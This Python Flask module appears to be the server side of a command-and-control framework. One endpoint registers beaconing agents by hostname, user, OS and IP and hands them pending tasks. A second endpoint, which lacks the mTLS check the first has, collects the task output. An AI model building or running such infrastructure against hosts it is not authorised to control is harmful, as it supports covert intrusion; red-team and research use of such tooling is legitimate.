import json
from flask import Blueprint, request, jsonify

from database import get_db
from middleware.auth import require_mtls
from services.crypto import decrypt_data

beacon_bp = Blueprint("beacon", __name__)


@beacon_bp.route("/beacon", methods=["POST"])
@require_mtls
def beacon():
    encrypted    = request.json.get("data")
    beacon_info  = json.loads(decrypt_data(encrypted))
    agent_id     = beacon_info.get("id")

    db = get_db()
    db.execute("""
        INSERT INTO agents (id, hostname, user, os, ip, last_seen)
        VALUES (?, ?, ?, ?, ?, datetime('now'))
        ON CONFLICT(id) DO UPDATE SET
            hostname  = excluded.hostname,
            user      = excluded.user,
            os        = excluded.os,
            ip        = excluded.ip,
            last_seen = datetime('now')
    """, (
        agent_id,
        beacon_info.get("hostname"),
        beacon_info.get("user"),
        beacon_info.get("os"),
        request.remote_addr,
    ))
    db.commit()

    tasks = db.execute("""
        SELECT uuid, task_json, scheduled_at FROM tasks
        WHERE agent_id = ? AND output IS NULL
    """, (agent_id,)).fetchall()

    if tasks:
        return [
            {"task": json.loads(t["task_json"]), "uuid": t["uuid"],
             "scheduled_at": t["scheduled_at"]}
            for t in tasks
        ]
    return []


@beacon_bp.route("/result", methods=["POST"])
def result():
    encrypted   = request.json.get("data")
    result_info = json.loads(decrypt_data(encrypted))

    db = get_db()
    db.execute("""
        UPDATE tasks SET output = ?, executed_at = ? WHERE uuid = ?
    """, (result_info.get("output"), result_info.get("executed_at"), result_info.get("uuid")))
    db.commit()

    return jsonify({"status": "received"})